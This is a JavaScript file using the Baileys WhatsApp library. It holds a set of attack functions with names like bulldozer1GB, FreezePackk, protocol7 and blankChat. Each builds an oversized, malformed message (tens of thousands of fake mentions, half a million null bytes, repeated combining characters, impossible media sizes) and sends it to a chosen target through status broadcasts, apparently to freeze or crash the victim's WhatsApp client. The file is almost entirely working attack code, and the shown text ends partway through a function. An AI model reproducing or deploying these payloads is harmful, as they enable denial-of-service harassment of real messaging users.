import  {
  generateWAMessageContent, 
  generateWAMessageFromContent, 
} from "@whiskeysockets/baileys";
import chalk from 'chalk';
// Delay function
async function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// In each function that needs it, add this at the top:
function formatJid(input) {
  const formattedNumber = String(input).replace(/[^0-9]/g, "");
  if (!formattedNumber) throw new Error("Invalid number provided.");
  return `${formattedNumber}@s.whatsapp.net`;
}

async function bulldozer1GB(sock, jid) {

  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(jid, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}


  async function InVisibleX(sock, jid, mention) {
            let msg = await generateWAMessageFromContent(jid, {
                buttonsMessage: {
                    text: " ✦ ",
                    contentText:
                        "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
                    footerText: "vip",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [jid],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: jid },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (mention) {
                await sock.relayMessage(
                    jid,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "hmmm",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }
        
async function FreezePackk(sock, jid) {
    await sock.relayMessage(jid, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "𐍃𐌍𐌉𐌕𐌂𐌇" + "ꦾ".repeat(70000),
      publisher: "𐍃𐌍𐌉𐌕𐌂𐌇.id" + "",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 25000 }, () =>
                  `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
                        }
                    }, {});
}


        async function ZeroRadiactive(sock, jid, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Xrelly Modderx" + "ោ៝".repeat(10000),
        title: "Apollo X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "Y7jQDWDPfQSIEJ34j3BFn6Ad4NLuBer0W3UTHwqvpc8=",
    fileLength: "5945180",
    seconds: 17,
    mediaKey: "4s+R9ADOCB3EUsrVDE6XbKWrUNv31GRuR/bo2z8U3DU=",
    height: 1280,
    width: 720,
    fileEncSha256: "hG/yZfURm4ryYYa0JUnHdNautOMsYGoFKDGd5/4OGLQ=",
    directPath: "/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1746415507",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        },
        streamingSidecar: "Rtr68xZ6G4TzcRHjr2QpMxn4BDOY3u/wOhpZ7qJj+Cg8o5+aXkCfIr2XfjcFmaQk/CgQLAOyAU6D5mHVhXkKxHpzrhZ2koMZVQLsRHAd5KwxayVXt+6eSl8ZnzpxdFhQ+HTByMt4tpTA39l6zU/jpCdDR/qzd/0Rs3qqwCuswd5ZiUf1c0CB9GwQUmc+yFFux6mspHm/gUe+TkftR2ZiKtf3Y5j9RmHHt9IuFX1KVj9jNj20ZfOJptjEYhgDwfDBIdr3/ddRQNaAlRyp2wTh8XEKUynBSbONgnjPIkj8JEl0OsFJqMeTwQyub9HsM/vRa6o8av0NHBn37ZO8Nag05Dpdvon0swsdnXDtomN6q4x+ls2RfnSeEAvRFGsgiG8H8naybUUY0uhYDpPBYHvuH/9fRwDOD9SPITongjimPplk0GOOmfeAamC9EbhDs/c8/5XL40AUbvshQDLIG3l0oTV4ta6zy/VdAclglFmhfVqeedilMk+lG29lpfIbag1nFu+qPZLIieXYQJ418DtASPmFtbsNYkvprPx7xF9ZtyoIa6gZ+v/4qCigvshtRf5n9msopfNJjyPLIrMAoq1475aB4j3puzXwkNm5NSVIahkuX1HWPnApe5lgOzymvJj3N/n0JCg/+PIYv4Jm6z0ZInZRxt3hrvXObchfVIkVuSKqd5U8WIjoOf+FI+CrvdaZBnb+2KH8A1GkskhNTL3DO+Sv1qYRlBFsk21So8abrZlqspnfVMF7DSoJen6s8GowXbrrJZPvwDnhhzL4IKjY0mrUzxnwTeCycU6OstR/ZKMkbg7OUA3+g+pM1k6eLdN53mkMKCt13WwvXndvmW/ekTMqOYc/rjoFQovbTPhcAMTX/kLegR3meuhxBvNE8xXyYvrI6lIIeGpNNsV32O03Li99BwF7hG7OxydsX0/OsYqJnPAUqvUdb1L9dTafihVeZPdokMN4VjqohFhgZiPsaNQScWDL/kAokANUdQ5QgEy6cn5/stxZMb0H7+grn3jHyBX7TfCnA7xjnyLJ4EEn1GN1NwapIyCP2+wwO4ewVHtkcEN88tzj5XIpYTASomq3ITa0iuZiparFg4Th3OGGKNCF4dwOnwARxsAhQisJUFr7mZq6qS6rTAvXWBkIDjr/3+FSvbG5RJJzMl9a1NN9tj4+epOQqkSKzjWbhv0f6fI1FTlJOpKkfsE5HIdWDg==",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const msg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});

    const msg2 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
        messageId: msg1.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
        messageId: msg2.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    if (mention) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}

async function protocol7(sock, jid, mention) {
  const floods = 50000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(jid, messageContent, { userJid: jid });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: jid }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await sock.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await sock.relayMessage(jid, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " 𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 "
        },
        content: undefined
      }]
    });
  }
}

        async function delayresponse(sock, jid) {
const mentionedList = [
  "13135550002@s.whatsapp.net",
  ...Array.from({ length: 30000 }, () =>
    `1${Math.floor(Math.random() * 1e15)}@s.whatsapp.net`
  )
];
    
  const message = {
    buttonsResponseMessage: {
      selectedButtonId: "ោ៝".repeat(10000),
      selectedDisplayText: "ExploiterX",
      contextInfo: {
        mentionedJid: mentionedList,
          quotedMessage: {
              message: {
                text: "A M E L I A IS RUN",
                footer: "XxX",
                buttons: [{
                    buttonId: `🚀`, 
                    buttonText: {
                        displayText: '~𑇂𑆵𑆴𑆿'.repeat(5000)
                    },
                    type: 1 
                }],
                headerType: 1,
                viewOnce: false
              }
          },          
      },
      type: 1
    }
  };

  const protoMessage = generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message
    }
  }, {});

  await sock.relayMessage("status@broadcast", protoMessage.message, {
            messageId: protoMessage.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                }]
            }]
        });
    }

async function protocol8(sock, jid, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "𐍃𐌍𐌉𐌕𐌂𐌇" + "ោ៝".repeat(20000),
        title: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/snitch",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(jid, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
                content: undefined
            }]
        });
    }
} 

  async function blankChat(sock, jid) {
                    await sock.relayMessage(jid, {
                        stickerPackMessage: {
                            stickerPackId: "X",
                            name: "~ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ~   ༘‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                            publisher: "~ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ~   ༘‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                            stickers: [
                                {
                                    fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
